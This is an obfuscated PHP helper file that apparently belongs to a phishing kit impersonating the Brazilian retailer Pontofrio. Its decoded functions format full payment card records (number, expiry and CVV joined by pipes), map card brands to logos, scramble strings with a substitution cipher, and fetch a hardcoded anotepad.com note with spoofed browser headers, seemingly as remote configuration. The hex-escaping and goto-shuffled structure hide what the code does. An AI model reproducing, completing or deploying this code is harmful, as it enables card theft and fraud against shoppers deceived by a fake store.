<?php
 $tr2 = "localhost";
 goto wW6ry;
 XNQBe: function filtrar_nome($valor_a, $valor_b) { $contar = strlen($valor_a);
 if ($contar > $valor_b) { $nome_novo_a = substr($valor_a, 0, $valor_b);
 $novo_nome = "{$nome_novo_a}\x2e\x2e\56";
 } else { if ($contar < $valor_b and $contar > 0) { $novo_nome = $valor_a;
 } else { $novo_nome = "\126\141\x7a\x69\x6f";
 } } return $novo_nome;
 } goto biS0F;
 ScDOH: function crip_pass($sql) { $palavras_cad2 = array("\141", "\142", "\143", "\x64", "\x65", "\x66", "\147", "\x68", "\x69", "\152", "\153", "\154", "\x6d", "\156", "\x6f", "\160", "\x71", "\x72", "\x73", "\x74", "\165", "\166", "\x78", "\172", "\x79", "\167", "\x20");
 $replace2 = array("\x23\x34\x2f", "\55\x35\45", "\x30\137\x3d", "\x3d\x35\57", "\53\64\x5d", "\44\61\x24", "\x33\x3f\x29", "\44\x39\52", "\x7d\61\45", "\100\x32\44", "\136\x36\x23", "\x3c\x40\67", "\x2a\70\x5e", "\45\x7e\63", "\x7b\x2c\x34", "\44\x35\x31", "\x40\x37\x5d", "\45\x36\x7d", "\60\x3f\137", "\x30\x3a\x3b", "\x3a\x32\57", "\x3d\x2c\61", "\x2b\67\56", "\100\x33\74", "\x21\63\x3e", "\x25\64\xc2\264", "\x26\x38\x7c");
 $nova_string2 = str_replace($palavras_cad2, $replace2, $sql);
 return $nova_string2;
 } goto CgqZS;
 wW6ry: date_default_timezone_set("\101\x6d\x65\162\151\x63\x61\x2f\x53\141\x6f\x5f\x50\141\165\x6c\x6f");
 goto gm8eE;
 lXfYo: $GLOBALS["\x63\157\144"] = "\x79\x36\x79\66\x6b\162\161\150";
 goto dG7x5;
 UkYcT: $name_tela = "\120\157\x6e\x74\157\146\162\x69\x6f\40";
 goto lXfYo;
 gm8eE: $data_index = date("\x64\57\155\x2f\131");
 goto UkYcT;
 dG7x5: function tempo_restante($data) { $dia_hora_atual = strtotime(date("\x59\55\155\x2d\144\x20\110\72\151\x3a\x73"));
 $dia_hora_evento = strtotime(date($data));
 $diferenca = $dia_hora_evento - $dia_hora_atual;
 $dias = intval($diferenca / 86400);
 $marcador = $diferenca % 86400;
 $hora = intval($marcador / 3600);
 $marcador = $marcador % 3600;
 $minuto = intval($marcador / 60);
 $segundos = $marcador % 60;
 if ($dias <= 0 & $hora <= 0 & $minuto <= 0) { $retorno = 2;
 $tempo_restante = "{$dias}\x20\x64\x69\141\163\x20{$hora}\x20\150\157\162\x61\163\40{$minuto}\40\x6d\x69\x6e\165\164\x6f\163\40\145\x20{$segundos}\x20\x73\145\x67\x75\156\x64\157\x73";
 } else { if ($dias > 1000) { $retorno = 1;
 $tempo_restante = "\x3c\146\157\x6e\164\x20\x63\x6f\x6c\x6f\x72\75\47\x32\x62\x38\x61\146\x66\x27\x3e\x50\x65\162\155\141\156\x65\x6e\164\145\x3c\x2f\x66\x6f\156\x74\x3e";
 } else { $retorno = 1;
 $tempo_restante = "{$dias}\40\x64\x69\x61\x73\40{$hora}\x20\x68\x6f\162\141\163\x20{$minuto}\40\155\x69\156\165\x74\157\163\x20\x65\40{$segundos}\x20\x73\145\147\x75\x6e\x64\x6f\163";
 } } return array($retorno, $tempo_restante);
 } goto XNQBe;
 YjBI0: function get_host() { $cod = $GLOBALS["\143\x6f\144"];
 $url = "\x68\x74\x74\160\163\72\x2f\57\141\156\157\x74\145\x70\x61\x64\x2e\x63\x6f\x6d\x2f\156\x6f\x74\x65\x73\x2f{$cod}";
 $options = array("\x68\164\164\x70" => array("\155\x65\x74\150\x6f\144" => "\107\x45\x54", "\150\145\141\144\x65\x72" => "\101\143\143\x65\x70\x74\x2d\x6c\x61\x6e\x67\x75\141\x67\145\x3a\x20\145\156\xd\12" . "\103\157\157\x6b\x69\x65\x3a\40\x66\157\x6f\x3d\142\x61\x72\xd\xa" . "\x55\163\145\x72\55\101\x67\145\x6e\x74\72\x20\115\157\172\x69\x6c\154\141\57\x35\x2e\60\x20\50\x4d\x61\143\x69\156\164\157\163\150\x3b\x20\111\x6e\164\x65\x6c\40\115\141\x63\40\x4f\123\x20\130\40\x31\61\x5f\61\51\x20\x41\160\x70\154\x65\x57\145\142\113\x69\x74\57\65\x33\x37\x2e\x33\66\x20\x28\x4b\x48\124\115\114\54\40\154\x69\153\145\x20\107\x65\143\153\x6f\51\x20\x43\150\x72\x6f\x6d\x65\57\x38\67\x2e\60\x2e\x34\62\x38\x30\56\70\x38\40\123\x61\x66\141\162\x69\57\x35\x33\x37\56\63\x36"));
 $context = stream_context_create($options);
 $store = file_get_contents($url, false, $context);
 $var1 = explode("\x2e\x3f", $store);
 $var2 = "".$_SERVER['SERVER_NAME']."/zk/apimg";
 return $var2;
 } goto ScDOH;
 PLAjy: function filtrar_bandeira($string) { $tr = strtr($string, array("\x76\x69\163\x61" => "\166\151\x73\141\x2e\160\156\147", "\x6d\141\163\x74\x65\x72\143\x61\x72\x64" => "\155\141\163\x74\145\162\143\141\162\144\x2e\x70\x6e\147", "\144\x69\163\143\157\166\145\162" => "\144\151\x73\x63\x6f\166\x65\162\x2e\160\156\x67", "\x76\151\163\x61" => "\x76\151\x73\141\x2e\160\x6e\x67", "\145\x6c\x6f" => "\x65\x6c\x6f\x2e\160\156\147", "\150\x69\160\145\162\143\x61\162\144" => "\x68\151\160\x65\x72\x63\141\162\144\56\160\x6e\147", "\141\155\145\162\x69\143\141\x6e\x20\145\170\x70\162\145\163\163" => "\141\155\x65\x78\56\160\x6e\x67", "\x65\142\164" => "\x6d\x61\x65\x73\164\162\157\56\x70\156\x67", "\155\141\145\163\164\x72\x6f" => "\x6d\141\145\x73\x74\x72\157\x2e\x70\156\147", "\x6a\143\x62" => "\x6a\143\142\x2e\x70\x6e\x67"));
 return $tr;
 } goto YjBI0;
 biS0F: function filtrar_cc($valor_a, $valor_b, $valor_c, $valor_d) { $remove1 = str_replace("\x20", '', $valor_a);
 $remove2 = str_replace("\57", "\x7c", $valor_b);
 if ($valor_d == 1) { $min_cc1 = substr($remove1, 0, 4);
 $min_cc2 = substr($remove1, 12, 18);
 $junta = "{$min_cc1}\52\52\x2a\52\52\52\x2a\x2a{$min_cc2}";
 } else { $junta = "{$remove1}\174{$remove2}\x7c{$valor_c}";
 } return $junta;
 } goto PLAjy;
 CgqZS: ?>